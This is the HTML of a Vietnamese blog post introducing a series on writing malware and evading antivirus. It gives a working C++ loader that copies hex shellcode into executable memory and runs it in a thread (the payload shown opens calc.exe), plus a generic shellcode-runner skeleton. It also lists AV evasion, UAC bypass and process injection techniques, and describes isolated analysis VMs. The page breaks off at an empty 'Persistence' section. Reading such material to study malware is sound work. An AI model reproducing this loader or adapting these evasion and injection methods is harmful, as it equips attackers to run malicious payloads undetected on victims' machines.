<!DOCTYPE html>
<html>
  <head>
    <!-- Google tag (gtag.js) -->
    <script
      async
      src="https://www.googletagmanager.com/gtag/js?id=G-3NTSMWGK5D"
    ></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());

      gtag("config", "G-3NTSMWGK5D");
    </script>
    <meta charset="UTF-8" />
    <title>Malware Writing Introduction</title>
    <link
      rel="icon"
      type="image/png"
      href="https://asayami.github.io/favicon.png"
    />
    <link
      rel="stylesheet"
      href="https://asayami.github.io/theme/notebook.css"
    />
    <link rel="stylesheet" href="https://asayami.github.io/theme/theme.css" />
    <script src="https://asayami.github.io/theme/notebook.js"></script>
    <script src="https://asayami.github.io/theme/theme.js"></script>
    <link
      rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
      integrity="sha512-Fo3rlrZj/k7ujTnHg4CGR2D7kSs0v4LLanw2qksYuRlEzO+tcaEPQogQ0KaoGN26/zrn20ImR1DfuLWnOo7aBA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"
    ></script>
    <meta
      name="description"
      content="Những bài viết, kinh nghiệm của mình về malware"
    />
    <meta name="keywords" content="Hacking, hack, malware, virus, assembly" />
    <meta name="author" content="Asayami Kurashin" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <div id="themeSpace"></div>
    <script>
      loadNavbar();
    </script>

    <img class="mainPicture" src="malware_source/malware_bg.jpg" />
    <div class="paragraph">
      <p>
        Trước khi chúng ta tìm hiểu về malware, bạn đọc nên phân biệt sự khác
        nhau giữa spyware, malware, virus, trojan, worm hay rootkit… và phải có
        hiểu biết sơ qua về Assembly, cách bộ xử lí, bộ nhớ hoạt động,...
      </p>
      <p>
        Có thể tìm hiểu về x86 Assembly từ trang cocomelonc tại:
        <a
          href="https://cocomelonc.github.io/tutorial/2021/10/03/malware-analysis-1.html"
          >Part 1</a
        >,
        <a
          href="https://cocomelonc.github.io/tutorial/2021/10/08/malware-analysis-2.html"
          >Part 2</a
        >.
      </p>

      <p>
        Malware (phần mềm độc hại) về cơ bản là bất kỳ loại phần mềm nào có ý
        định làm hại vào máy tính (thu thập thông tin, truy cập dữ liệu nhạy
        cảm…) Malware bao gồm virus, trojan, rootkit, worm, keylogger, spyware,
        adware, v.v... Bây giờ, chúng ta đi sâu phân tích malware.
      </p>
      <p>
        Series này sẽ tập trung tìm hiểu về cách tạo ra một malware, bypass AV
        (anti virus). Không khuyến khích sử dụng những bài viết này vào mục đích
        trái phép. Nội dung của bài viết sẽ dựa trên kinh nghiệm cá nhân mình và
        trang
        <a href="https://cocomelonc.github.io/">cocomelonc</a>.
      </p>
      <p>
        Để test bất kỳ một ứng dụng hay tệp tin nào có nguy hiểm hay không, bạn
        đọc có thể sử dụng trang
        <a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a> hoặc
        phân tích trên máy ảo. Chi tiết về cài đặt môi trường máy ảo mình sẽ nói
        chi tiết hơn ở phần Environment.
      </p>
      <p>
        Có thể viết malware trên nhiều ngôn ngữ như C, Python,... Tuy nhiên,
        series này chủ yếu sẽ sử dụng C bởi tính gọn nhẹ, low level,...
      </p>
      <p>Bắt đầu với một malware viết bằng C++ đơn giản:</p>
      <pre><a style="color: #009933;"><code>
<!-- HTML generated using hilite.me --><div style="background: #ffffff; overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #888888">/*</span>
<span style="color: #888888">cpp implementation malware example with calc.exe payload</span>
<span style="color: #888888">*/</span>
<span style="color: #557799">#include &lt;windows.h&gt;</span>
<span style="color: #557799">#include &lt;stdio.h&gt;</span>
<span style="color: #557799">#include &lt;stdlib.h&gt;</span>
<span style="color: #557799">#include &lt;string.h&gt;</span>

<span style="color: #888888">// our payload calc.exe</span>
<span style="color: #333399; font-weight: bold">unsigned</span> <span style="color: #333399; font-weight: bold">char</span> my_payload[] <span style="color: #333333">=</span> {
  <span style="color: #005588; font-weight: bold">0xfc</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x83</span>, <span style="color: #005588; font-weight: bold">0xe4</span>, <span style="color: #005588; font-weight: bold">0xf0</span>, <span style="color: #005588; font-weight: bold">0xe8</span>, <span style="color: #005588; font-weight: bold">0xc0</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x51</span>,
  <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x50</span>, <span style="color: #005588; font-weight: bold">0x52</span>, <span style="color: #005588; font-weight: bold">0x51</span>, <span style="color: #005588; font-weight: bold">0x56</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x31</span>, <span style="color: #005588; font-weight: bold">0xd2</span>, <span style="color: #005588; font-weight: bold">0x65</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x52</span>,
  <span style="color: #005588; font-weight: bold">0x60</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x52</span>, <span style="color: #005588; font-weight: bold">0x18</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x52</span>, <span style="color: #005588; font-weight: bold">0x20</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x72</span>,
  <span style="color: #005588; font-weight: bold">0x50</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x0f</span>, <span style="color: #005588; font-weight: bold">0xb7</span>, <span style="color: #005588; font-weight: bold">0x4a</span>, <span style="color: #005588; font-weight: bold">0x4a</span>, <span style="color: #005588; font-weight: bold">0x4d</span>, <span style="color: #005588; font-weight: bold">0x31</span>, <span style="color: #005588; font-weight: bold">0xc9</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x31</span>, <span style="color: #005588; font-weight: bold">0xc0</span>,
  <span style="color: #005588; font-weight: bold">0xac</span>, <span style="color: #005588; font-weight: bold">0x3c</span>, <span style="color: #005588; font-weight: bold">0x61</span>, <span style="color: #005588; font-weight: bold">0x7c</span>, <span style="color: #005588; font-weight: bold">0x02</span>, <span style="color: #005588; font-weight: bold">0x2c</span>, <span style="color: #005588; font-weight: bold">0x20</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0xc1</span>, <span style="color: #005588; font-weight: bold">0xc9</span>, <span style="color: #005588; font-weight: bold">0x0d</span>, <span style="color: #005588; font-weight: bold">0x41</span>,
  <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xc1</span>, <span style="color: #005588; font-weight: bold">0xe2</span>, <span style="color: #005588; font-weight: bold">0xed</span>, <span style="color: #005588; font-weight: bold">0x52</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x51</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x52</span>, <span style="color: #005588; font-weight: bold">0x20</span>, <span style="color: #005588; font-weight: bold">0x8b</span>,
  <span style="color: #005588; font-weight: bold">0x42</span>, <span style="color: #005588; font-weight: bold">0x3c</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xd0</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x80</span>, <span style="color: #005588; font-weight: bold">0x88</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x48</span>,
  <span style="color: #005588; font-weight: bold">0x85</span>, <span style="color: #005588; font-weight: bold">0xc0</span>, <span style="color: #005588; font-weight: bold">0x74</span>, <span style="color: #005588; font-weight: bold">0x67</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xd0</span>, <span style="color: #005588; font-weight: bold">0x50</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x18</span>, <span style="color: #005588; font-weight: bold">0x44</span>,
  <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x40</span>, <span style="color: #005588; font-weight: bold">0x20</span>, <span style="color: #005588; font-weight: bold">0x49</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xd0</span>, <span style="color: #005588; font-weight: bold">0xe3</span>, <span style="color: #005588; font-weight: bold">0x56</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0xc9</span>, <span style="color: #005588; font-weight: bold">0x41</span>,
  <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x34</span>, <span style="color: #005588; font-weight: bold">0x88</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xd6</span>, <span style="color: #005588; font-weight: bold">0x4d</span>, <span style="color: #005588; font-weight: bold">0x31</span>, <span style="color: #005588; font-weight: bold">0xc9</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x31</span>, <span style="color: #005588; font-weight: bold">0xc0</span>,
  <span style="color: #005588; font-weight: bold">0xac</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0xc1</span>, <span style="color: #005588; font-weight: bold">0xc9</span>, <span style="color: #005588; font-weight: bold">0x0d</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xc1</span>, <span style="color: #005588; font-weight: bold">0x38</span>, <span style="color: #005588; font-weight: bold">0xe0</span>, <span style="color: #005588; font-weight: bold">0x75</span>, <span style="color: #005588; font-weight: bold">0xf1</span>,
  <span style="color: #005588; font-weight: bold">0x4c</span>, <span style="color: #005588; font-weight: bold">0x03</span>, <span style="color: #005588; font-weight: bold">0x4c</span>, <span style="color: #005588; font-weight: bold">0x24</span>, <span style="color: #005588; font-weight: bold">0x08</span>, <span style="color: #005588; font-weight: bold">0x45</span>, <span style="color: #005588; font-weight: bold">0x39</span>, <span style="color: #005588; font-weight: bold">0xd1</span>, <span style="color: #005588; font-weight: bold">0x75</span>, <span style="color: #005588; font-weight: bold">0xd8</span>, <span style="color: #005588; font-weight: bold">0x58</span>, <span style="color: #005588; font-weight: bold">0x44</span>,
  <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x40</span>, <span style="color: #005588; font-weight: bold">0x24</span>, <span style="color: #005588; font-weight: bold">0x49</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xd0</span>, <span style="color: #005588; font-weight: bold">0x66</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x0c</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x44</span>,
  <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x40</span>, <span style="color: #005588; font-weight: bold">0x1c</span>, <span style="color: #005588; font-weight: bold">0x49</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0xd0</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x04</span>, <span style="color: #005588; font-weight: bold">0x88</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x01</span>,
  <span style="color: #005588; font-weight: bold">0xd0</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x58</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x58</span>, <span style="color: #005588; font-weight: bold">0x5e</span>, <span style="color: #005588; font-weight: bold">0x59</span>, <span style="color: #005588; font-weight: bold">0x5a</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x58</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x59</span>,
  <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x5a</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x83</span>, <span style="color: #005588; font-weight: bold">0xec</span>, <span style="color: #005588; font-weight: bold">0x20</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x52</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0xe0</span>, <span style="color: #005588; font-weight: bold">0x58</span>, <span style="color: #005588; font-weight: bold">0x41</span>,
  <span style="color: #005588; font-weight: bold">0x59</span>, <span style="color: #005588; font-weight: bold">0x5a</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x12</span>, <span style="color: #005588; font-weight: bold">0xe9</span>, <span style="color: #005588; font-weight: bold">0x57</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0x5d</span>, <span style="color: #005588; font-weight: bold">0x48</span>,
  <span style="color: #005588; font-weight: bold">0xba</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x8d</span>, <span style="color: #005588; font-weight: bold">0x8d</span>,
  <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0x01</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0xba</span>, <span style="color: #005588; font-weight: bold">0x31</span>, <span style="color: #005588; font-weight: bold">0x8b</span>, <span style="color: #005588; font-weight: bold">0x6f</span>, <span style="color: #005588; font-weight: bold">0x87</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0xd5</span>,
  <span style="color: #005588; font-weight: bold">0xbb</span>, <span style="color: #005588; font-weight: bold">0xf0</span>, <span style="color: #005588; font-weight: bold">0xb5</span>, <span style="color: #005588; font-weight: bold">0xa2</span>, <span style="color: #005588; font-weight: bold">0x56</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0xba</span>, <span style="color: #005588; font-weight: bold">0xa6</span>, <span style="color: #005588; font-weight: bold">0x95</span>, <span style="color: #005588; font-weight: bold">0xbd</span>, <span style="color: #005588; font-weight: bold">0x9d</span>, <span style="color: #005588; font-weight: bold">0xff</span>,
  <span style="color: #005588; font-weight: bold">0xd5</span>, <span style="color: #005588; font-weight: bold">0x48</span>, <span style="color: #005588; font-weight: bold">0x83</span>, <span style="color: #005588; font-weight: bold">0xc4</span>, <span style="color: #005588; font-weight: bold">0x28</span>, <span style="color: #005588; font-weight: bold">0x3c</span>, <span style="color: #005588; font-weight: bold">0x06</span>, <span style="color: #005588; font-weight: bold">0x7c</span>, <span style="color: #005588; font-weight: bold">0x0a</span>, <span style="color: #005588; font-weight: bold">0x80</span>, <span style="color: #005588; font-weight: bold">0xfb</span>, <span style="color: #005588; font-weight: bold">0xe0</span>,
  <span style="color: #005588; font-weight: bold">0x75</span>, <span style="color: #005588; font-weight: bold">0x05</span>, <span style="color: #005588; font-weight: bold">0xbb</span>, <span style="color: #005588; font-weight: bold">0x47</span>, <span style="color: #005588; font-weight: bold">0x13</span>, <span style="color: #005588; font-weight: bold">0x72</span>, <span style="color: #005588; font-weight: bold">0x6f</span>, <span style="color: #005588; font-weight: bold">0x6a</span>, <span style="color: #005588; font-weight: bold">0x00</span>, <span style="color: #005588; font-weight: bold">0x59</span>, <span style="color: #005588; font-weight: bold">0x41</span>, <span style="color: #005588; font-weight: bold">0x89</span>,
  <span style="color: #005588; font-weight: bold">0xda</span>, <span style="color: #005588; font-weight: bold">0xff</span>, <span style="color: #005588; font-weight: bold">0xd5</span>, <span style="color: #005588; font-weight: bold">0x63</span>, <span style="color: #005588; font-weight: bold">0x61</span>, <span style="color: #005588; font-weight: bold">0x6c</span>, <span style="color: #005588; font-weight: bold">0x63</span>, <span style="color: #005588; font-weight: bold">0x2e</span>, <span style="color: #005588; font-weight: bold">0x65</span>, <span style="color: #005588; font-weight: bold">0x78</span>, <span style="color: #005588; font-weight: bold">0x65</span>, <span style="color: #005588; font-weight: bold">0x00</span>
};
<span style="color: #333399; font-weight: bold">unsigned</span> <span style="color: #333399; font-weight: bold">int</span> my_payload_len <span style="color: #333333">=</span> <span style="color: #008800; font-weight: bold">sizeof</span>(my_payload);

<span style="color: #333399; font-weight: bold">int</span> <span style="color: #0066BB; font-weight: bold">main</span>(<span style="color: #333399; font-weight: bold">void</span>) {
  <span style="color: #333399; font-weight: bold">void</span> <span style="color: #333333">*</span> my_payload_mem; <span style="color: #888888">// memory buffer for payload</span>
  BOOL rv;
  HANDLE th;
  DWORD oldprotect <span style="color: #333333">=</span> <span style="color: #0000DD; font-weight: bold">0</span>;

  <span style="color: #888888">// Allocate a memory buffer for payload</span>
  my_payload_mem <span style="color: #333333">=</span> VirtualAlloc(<span style="color: #0000DD; font-weight: bold">0</span>, my_payload_len, MEM_COMMIT <span style="color: #333333">|</span> MEM_RESERVE, PAGE_READWRITE);

  <span style="color: #888888">// copy payload to buffer</span>
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);

  <span style="color: #888888">// make new buffer as executable</span>
  rv <span style="color: #333333">=</span> VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, <span style="color: #333333">&amp;</span>oldprotect);
  <span style="color: #008800; font-weight: bold">if</span> ( rv <span style="color: #333333">!=</span> <span style="color: #0000DD; font-weight: bold">0</span> ) {

    <span style="color: #888888">// run payload</span>
    th <span style="color: #333333">=</span> CreateThread(<span style="color: #0000DD; font-weight: bold">0</span>, <span style="color: #0000DD; font-weight: bold">0</span>, (LPTHREAD_START_ROUTINE) my_payload_mem, <span style="color: #0000DD; font-weight: bold">0</span>, <span style="color: #0000DD; font-weight: bold">0</span>, <span style="color: #0000DD; font-weight: bold">0</span>);
    WaitForSingleObject(th, <span style="color: #333333">-</span><span style="color: #0000DD; font-weight: bold">1</span>);
  }
  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">0</span>;
}
</pre></div>    
        </code></a></pre>
      <p>
        Chương trình trên sẽ thực thi đoạn mã ở trong my_payload. Đoạn mã đó
        được gọi là shell code, được viết bằng Assembly và chuyển sang dạng hex.
        Chúng ta có thể viết đoạn mã để chạy một chương trình khác, can thiệp
        process hay memory, rce thông qua reverse shell,... Đoạn mã bên trên
        được viết để khởi chạy calc.exe trên Windows.
      </p>
      <p>
        VirtualAlloc là hàm để tạo vùng nhớ theo yêu cần, về chức năng nó giống
        malloc trong C. MEM_RESERVE dùng để tạo ô nhớ ảo, còn MEM_COMMIT dùng để
        link ô nhớ ảo với ô nhớ physical. PAGE_READWRITE là quyền hạn với vùng
        nhớ, cho phép đọc và ghi.
      </p>
      <p>RtlMoveMemory dùng để copy payload vào vùng nhớ.</p>
      <p>
        VirtualProtect dùng để thay đổi quyền hạn từ đọc & ghi thành đọc & thực
        thi. Lí do không để cả 3 quyền hạn từ đầu cho vùng nhớ là vì thông
        thường một vùng nhớ chỉ có 2 quyền hạn, nếu có tới 3 thì bất thường và
        dễ bị AV phát hiện.
      </p>
      <p>
        Cuối cùng, CreateThread dùng để khởi chạy payload ở một thread khác
        trong chương trình này.
      </p>
      <p>
        Sau khi compile và chạy chúng ta sẽ đạt được kết quả như đã nêu trên.
      </p>
      <p>
        Chúng ta có thể dịch ngược file PE này và dễ dàng thấy các hàm đã được
        sử dụng cũng như payload của chúng ta. Có nhiều công cụ dịch ngược như
        Ghidra, IDA,...
      </p>
      <p>
        Đây là kết quả của VirusTotal trả về khi quét file PE này, 49/71 AV phát
        hiện:
        <a
          href="https://www.virustotal.com/gui/file/c9c49dbbb0a668df053d0ab788f9dde2d9e59c31672b5d296bb1e8309d7e0dfe/detection"
          >Here</a
        >.
      </p>
    </div>

    <div class="paratitle">
      <h2>Environment</h2>
    </div>
    <div class="paragraph">
      <p>
        Để việc phân tích mã độc được trơn tru và an toàn, chúng ta phải có một
        môi trường đủ tốt. Các máy ảo phổ biến có thể kể tới như: Virtual Box,
        VMWare,... Chúng ta cũng có thể cài đặt FLARE-VM trên những máy ảo
        Windows và kết hợp chúng với Remnux để phân tích mã độc một cách hiệu
        quả hơn.
      </p>
      <p>
        Để bảo vệ máy host, chúng ta nên cập nhật các bản vá mới nhất của hệ
        điều hành máy host cũng như phần mềm ảo hoá mà chúng ta sử dụng (tránh
        trường hợp malware khai thác CVE của phần mềm ảo hoá thực thi mã độc
        trên máy host).
      </p>
      <p>
        Bên cạnh đó cũng cần cô lập mạng của máy guest với máy host, tránh
        trường hợp malware tấn công vào máy host thông qua mạng máy guest. Việc
        cài đặt này có thể thực hiện thông qua thiết lập mạng của phần mềm ảo
        hoá. Như trong VirtualBox chúng ta có thể sử dụng NAT Network để các máy
        guest trong cùng một mạng nội bộ, không giao tiếp được với máy host
        nhưng vẫn có thể truy cập Internet. Tránh sử dụng Bridge Network vì máy
        guest sẽ được cấp IP ngang hàng và có thể giao tiếp với máy host.
      </p>
      <p>
        Tính năng snapshot của phần mềm ảo hoá cũng rất hữu ích, giúp chúng ta
        lưu lại trạng thái của máy ảo trước khi thực thi mã độc, nếu có vấn đề
        chúng ta có thể khôi phục lại trạng thái trước đó.
      </p>
      <p>
        Một combo tốt để thực hiện phân tích mã độc là sử dụng FLARE-VM và
        Remnux trên 2 máy ảo khác nhau trong cùng mạng NAT Network, một máy ảo
        chạy Windows để phân tích mã độc và một máy ảo chạy Linux để phân tích
        môi trường mã độc. Luồng mạng của FLARE-VM sẽ được chuyển qua Remnux để
        phân tích.
      </p>
    </div>

    <div class="paratitle">
      <h2>Shellcoding</h2>
    </div>
    <div class="paragraph">
      <h3>Shellcoding là gì ?</h3>
      <p>
        Thuật ngữ shell code bắt nguồn từ một program từ xưa bị khai thác lỗ
        hổng và mở remote shell, từ đó kẻ tấn công có thể tương tác với hệ thống
        của nạn nhân. Và như ở trên, chúng ta đã thấy được shell code được sử
        dụng như thế nào. Mục đích sử dụng của shell code là để inject vào các
        program bị khai thác, và điều này thuận tiện hơn nhiều so với cách đưa
        code của các ngôn ngữ lập trình vào.
      </p>
      <p>
        Bạn đọc có thể viết Assembly shellcode trả về 0 và test shellcode của
        mình viết sử dụng đoạn code C này:
      </p>

      <!-- HTML generated using hilite.me -->
      <div
        style="
          background: #ffffff;
          overflow: auto;
          width: auto;
          border: solid gray;
          border-width: 0.1em 0.1em 0.1em 0.8em;
          padding: 0.2em 0.6em;
        "
      >
        <pre
          style="margin: 0; line-height: 125%"
        ><span style="color: #888888">/*</span>
<span style="color: #888888">run.c - a small skeleton program to run shellcode by cocomelonc</span>
<span style="color: #888888">*/</span>
<span style="color: #888888">// bytecode here</span>
<span style="color: #333399; font-weight: bold">char</span> code[] <span style="color: #333333">=</span> <span style="background-color: #fff0f0">&quot;my shellcode here&quot;</span>;

<span style="color: #333399; font-weight: bold">int</span> <span style="color: #0066BB; font-weight: bold">main</span>(<span style="color: #333399; font-weight: bold">int</span> argc, <span style="color: #333399; font-weight: bold">char</span> <span style="color: #333333">**</span>argv) {
  <span style="color: #333399; font-weight: bold">int</span> (<span style="color: #333333">*</span>func)();             <span style="color: #888888">// function pointer</span>
  func <span style="color: #333333">=</span> (<span style="color: #333399; font-weight: bold">int</span> (<span style="color: #333333">*</span>)()) code;   <span style="color: #888888">// func points to our shellcode</span>
  (<span style="color: #333399; font-weight: bold">int</span>)(<span style="color: #333333">*</span>func)();            <span style="color: #888888">// execute a function code[]</span>
  <span style="color: #888888">// if our program returned 0 instead of 1, </span>
  <span style="color: #888888">// so our shellcode worked</span>
  <span style="color: #008800; font-weight: bold">return</span> <span style="color: #0000DD; font-weight: bold">1</span>;
}
</pre>
      </div>
      <p>
        Đoạn code trên dùng để thực thi những gì được viết trong shellcode.
        Chúng ta cũng có thể viết lại ví dụ malware bên trên chỉ bằng shellcode.
      </p>
    </div>

    <div class="paratitle">
      <h2>AV Evasion</h2>
    </div>
    <div class="paragraph">
      <p>Để tránh bị AV phát hiện, chúng ta có nhiều cách như:</p>
      <ul>
        <li>
          Ẩn sự hiện diện của chuỗi và lời gọi hàm bằng thư viện:
          <a href="https://github.com/andrivet/ADVobfuscator">ADVobfuscator</a>
        </li>
        <li>
          Mã hoá đối xứng payload, rồi sau khi khởi tạo giá trị cho payload thì
          decrypt payload:
          <a
            href="https://cocomelonc.github.io/tutorial/2021/09/04/simple-malware-av-evasion.html"
            >Here</a
          >
        </li>
        <li>
          Function Call Obfuscation (ẩn DLL &#38; external functions) bằng
          GetProcAddress, GetModuleHandle &#38; XOR:
          <a
            href="https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html"
            >Here</a
          >
        </li>
        <li>
          Allocate và lấp đầy 100MB bộ nhớ:
          <a
            href="https://cocomelonc.github.io/tutorial/2021/12/25/simple-malware-av-evasion-3.html"
            >Here</a
          >
        </li>
        <li>
          Function Call Obfuscation (ẩn DLL &#38; external functions) làm rối
          GetProcAddress sử dụng ordinal &#38; EDT:
          <a
            href="https://cocomelonc.github.io/tutorial/2021/09/06/simple-malware-av-evasion-2.html"
            >Here</a
          >
        </li>
        <li>
          Function Call Obfuscation bằng cách so sánh hash:
          <a
            href="https://cocomelonc.github.io/tutorial/2022/03/22/simple-av-evasion-5.html"
            >Here</a
          >
        </li>
        <li>
          Check máy ảo VirtualBox bằng registry keys:
          <a
            href="https://cocomelonc.github.io/tutorial/2022/04/09/malware-av-evasion-6.html"
            >Here</a
          >
        </li>
        <li>
          Ẩn GetModuleHandle:
          <a
            href="https://cocomelonc.github.io/malware/2023/04/08/malware-av-evasion-15.html"
            >Here</a
          >
        </li>
        <li>
          Ẩn GetProcAddress:
          <a
            href="https://cocomelonc.github.io/malware/2023/04/16/malware-av-evasion-16.html"
            >Here</a
          >
        </li>
        <li>
          Leo thang đặc quyền (bypass UAC) sử dụng fodhelper.exe:
          <a
            href="https://cocomelonc.github.io/malware/2023/06/19/malware-av-evasion-17.html"
            >Here</a
          >
        </li>
      </ul>
    </div>

    <div class="paratitle">
      <h2>Injection</h2>
    </div>
    <div class="paragraph">
      <p>Một số phương pháp để inject payload và thực thi:</p>
      <ul>
        <li>
          Inject code vào process khác:
          <a
            href="https://cocomelonc.github.io/tutorial/2021/09/18/malware-injection-1.html"
            >Here</a
          >
        </li>
        <li>
          Inject DLL file vào process (tạo DLL Main và khởi chạy vùng nhớ chứa
          nó):
          <a
            href="https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html"
            >Here</a
          >
        </li>
        <li>
          Tìm PID theo tên process:
          <a
            href="https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html"
            >Here</a
          >
        </li>
        <li>APC (Asynchronous procedure call)...</li>
      </ul>
    </div>

    <div class="paratitle">
      <h2>Persistence</h2>
    </div>
    <div class="paragraph">
      <p>
